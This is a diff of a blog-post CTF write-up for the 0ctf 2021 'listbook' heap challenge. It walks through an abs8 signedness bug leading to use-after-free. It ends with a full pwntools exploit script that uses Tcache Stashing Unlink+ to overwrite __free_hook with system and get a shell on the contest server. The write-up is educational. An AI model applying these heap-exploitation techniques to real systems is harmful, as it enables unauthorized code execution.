@@ -16,29 +16,26 @@ image:
 ---
 # 0ctf 2021
 
-> CTF : https://ctftime.org/event/1356 <br>
-> Challenge : https://ctftime.org/writeup/29118 <br>
-> Points: 154 <br>
+CTF : https://ctftime.org/event/1356 <br>
+Challenge : https://ctftime.org/writeup/29118 <br>
+Points: 154 <br>
 
 # Checksec
 
-```
-{{< highlight yaml >}}
+```yaml
 Arch:     amd64-64-little
 RELRO:    Full RELRO
 Stack:    Canary found
 NX:       NX enabled
 PIE:      PIE enabled
 RUNPATH:  './'
-{{< / highlight >}}
 ```
 
 # Overview
 
 It's a classic `libc 2.31` heap challenge
 
-```
-{{< highlight ags >}}
+```ags
  _     _     _   ____              _    
 | |   (_)___| |_| __ )  ___   ___ | | __
 | |   | / __| __|  _ \ / _ \ / _ \| |/ /
@@ -51,7 +48,6 @@ It's a classic `libc 2.31` heap challenge
 3.show
 4.exit
 >>
-{{< / highlight >}}
 ```
 
 As shown in the options we can add , delete and show heap notes. Lets look at these functions in IDA now
@@ -143,8 +139,6 @@ void __noreturn remove()
 
 ### show
 
-<blockquote class="imgur-embed-pub" lang="en" data-id="a/1tXYIbB" data-context="false" ><a href="//imgur.com/a/1tXYIbB"></a></blockquote><script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script>
-
 ```c
 void __noreturn show()
 {
@@ -194,20 +188,29 @@ Lets give "A" as our name and hit breakpoint at 0x138f
 So everything is fine here right?. I bruteforced all values from 0x0 to 0xff and checked the returned value from the `gen_hash` function and saw something weird. Now lets give our `note->name` as "\x80"
 ![enter image description here](https://imgur.com/3cgsgFO.png) <br> Lets see the disassembly of `abs8()`. <br> So `al` is being right shifted by 7 and since `al` is being used instead of `eax` there is a signedness issue here. Lets follow the operations after the `sar` instruction
 
-{{< code language="nasm" title="abs8 disassembly" id="1" isCollapsed="false" >}}
+```c
 .text:000000000000138F ; 9:   sum = abs8(tmp);
-.text:000000000000138F                 movzx   eax, \[sum];
+.text:000000000000138F                 movzx   eax, [rbp+tmp];
 .text:0000000000001393                 sar     al, 7; eax = 0x80 (before shift)
 .text:0000000000001396                 mov     edx, eax; eax = 0xff 
 .text:0000000000001398                 mov     eax, edx; edx = 0xff 
-.text:000000000000139A                 xor     al, \[sum]; {al:=0xff} ^ {sum:=0x80}
-.text:000000000000139D                 sub     eax, edx; 0x7f-0xff
-.text:000000000000139F                 mov     \[sum], eax; eax = 0xffffff80
-.text:00000000000013A2 ; 10:   if ( sum > 15 ) \[false]
-.text:00000000000013A2                 cmp     \[sum], 0Fh
+.text:000000000000139A                 xor     al, [rbp+tmp]; al {0xff} ^ [rbp+tmp] {0x80}
+.text:000000000000139D                 sub     eax, edx; eax = 0x7f edx = 0xff
+.text:000000000000139F                 mov     [rbp+tmp], eax; eax = 0xffffff80
+.text:00000000000013A2 ; 10:   if ( sum > 15 ) [false]
+.text:00000000000013A2                 cmp     [rbp+tmp], 0Fh
 .text:00000000000013A6                 jle     short return_hash
+.text:00000000000013A8 ; 11:     sum %= 16;
+.text:00000000000013A8                 movzx   eax, [rbp+tmp]
+.text:00000000000013AC                 mov     edx, eax
+.text:00000000000013AE                 sar     dl, 7
+.text:00000000000013B1                 shr     dl, 4
+.text:00000000000013B4                 add     eax, edx
+.text:00000000000013B6                 and     eax, 0Fh
+.text:00000000000013B9                 sub     eax, edx
+.text:00000000000013BB                 mov     [rbp+tmp], al
 .text:00000000000013BE ; 12:   return sum; ; sum = 0xffffff80 :)) 
-{{< /code >}}
+```
 
 So there are two bugs. 
 
@@ -236,12 +239,10 @@ pwndbg> x/gx $in_use
 1. Use name "\x80" to trigger UAF in chunk idx 0 and 1.
 2. Since it uses libc 2.31 and the allocation size is 0x31 and 0x211 ( smallbin size ) we use [Tcache Stashing Unlink+](https://qianfei11.github.io/2020/05/05/Tcache-Stashing-Unlink-Attack/#Tcache-Stashing-Unlink-Attack-Plus) attack to create overlapping chunks and overwrite fd of the tcache in the list.<br>
 
-{{< code language="python" title="exploit" id="2" isCollapsed="true" >}}
+```python
 #!/usr/bin/env python3.9
-
-# \-*\- coding: utf-8 -*-
-
-**MODE** ="PWN"
+# -*- coding: utf-8 -*-
+__MODE__ ="PWN"
 
 from rootkit import *
 exe = context.binary = ELF('./listbook')
@@ -249,33 +250,33 @@ exe = context.binary = ELF('./listbook')
 host = args.HOST or '111.186.58.249'
 port = int(args.PORT or 20001)
 
-def local(argv=\[], *a, \*\*kw):
+def local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
     if args.GDB:
-        return gdb.debug(\[exe.path] + argv, gdbscript=gdbscript,* a, **kw)
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     else:
-        return process(\[exe.path] + argv, *a,** kw)
+        return process([exe.path] + argv, *a, **kw)
 
-def remote(argv=\[], \*a, \**kw):
+def remote(argv=[], *a, **kw):
     '''Connect to the process on the remote host'''
     io = connect(host, port)
     if args.GDB:
         gdb.attach(io, gdbscript=gdbscript)
     return io
 
-def start(argv=\[], *a, \*\*kw):
+def start(argv=[], *a, **kw):
     '''Start the exploit against the target.'''
     if args.LOCAL:
-        return local(argv,* a, **kw)
+        return local(argv, *a, **kw)
     else:
-        return remote(argv, *a,** kw)
+        return remote(argv, *a, **kw)
 
 gdbscript = '''
 tbreak main
 continue
-'''.format(\*\*locals())
+'''.format(**locals())
 
-# \-- Exploit goes here --
+# -- Exploit goes here --
 
 def option(choice):
     sla(">>", str(choice))
@@ -329,9 +330,7 @@ reu(b"=> ")
 reu(b"=> ")
 libc.address=uuu64(rl())-0x1ebbe0
 lb()
-
 # Rest is all Heap Feng Shui
-
 for i in range(2):
     add(b"\x09", b"X"*0x200)
 
@@ -348,9 +347,10 @@ add(b"\x04", b"B")
 delete(0)
 delete(9)
 delete(4)
-add(b"\x80", p(libc.sym\['__free_hook'])*64)
+add(b"\x80", p(libc.sym['__free_hook'])*64)
 delete(1) # trigger smallbin corruption overwrite fd & bk
 fd=hb+0x1790
+
 
 add(b"\x09", (p(fd)   +      p(hb+0x2d0)  + b"a"*0x10   )) # 0x19d0
 add(b"\x09", (p(hb+0x2d0)  + p(hb+0x19d0) + b"b"*0x10   )) # 0x2b10
@@ -363,10 +363,10 @@ add(b"\x09", (p(hb+0x2b10) + p(hb+0x1790) + b"f"*0x10   )) # 0x1790
 
 add(b"\x08", b"d"*8)
 add(b"\x00", b"A"*8 )
-add(b"\x00", p(0)*3 + p(0x31) + p(0)*5 + p(0x211) + p(libc.sym\['__free_hook']) + p(0) ) # overwrite fd of tcache to **free_hook
+add(b"\x00", p(0)*3 + p(0x31) + p(0)*5 + p(0x211) + p(libc.sym['__free_hook']) + p(0) ) # overwrite fd of tcache to __free_hook
 add(b"\x02", b"/bin/sh\x00"*8)
-add(b"\x00", p(libc.sym\['system'])) # overwrite** free_hook
+add(b"\x00", p(libc.sym['system'])) # overwrite __free_hook
 delete(2)
 
 io.interactive()
-{{< /code >}}
+```
